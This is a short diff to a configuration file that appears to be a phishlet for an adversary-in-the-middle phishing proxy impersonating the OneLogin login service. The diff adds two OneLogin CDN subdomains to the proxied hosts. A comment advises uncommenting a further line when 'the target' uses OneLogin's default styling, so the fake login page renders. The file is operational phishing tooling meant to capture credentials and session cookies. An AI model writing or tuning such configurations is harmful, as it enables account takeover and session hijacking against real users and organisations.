@@ -6,6 +6,8 @@ proxy_hosts:
   - {phish_sub: '', orig_sub: '', domain: 'onelogin.com', session: false, is_landing: false }
   - {phish_sub: 'EXAMPLE', orig_sub: 'EXAMPLE', domain: 'onelogin.com', session: true, is_landing: true}
   - {phish_sub: 'portal-cdn', orig_sub: 'portal-cdn', domain: 'onelogin.com', session: false, is_landing: false}
+  - {phish_sub: 'cdn', orig_sub: 'cdn', domain: 'onelogin.com', session: false, is_landing: false}
+  - {phish_sub: 'web-login-v2-cdn', orig_sub: 'web-login-v2-cdn', domain: 'onelogin.com', session: false, is_landing: false}
   # Uncomment this line if the target is using the default CSS for onelogin. Will manifest as the login page not loading.
   #- {phish_sub: 'web-login-cdn', orig_sub: 'web-login-cdn', domain: 'onelogin.com', session: false, is_landing: false}
 sub_filters: []
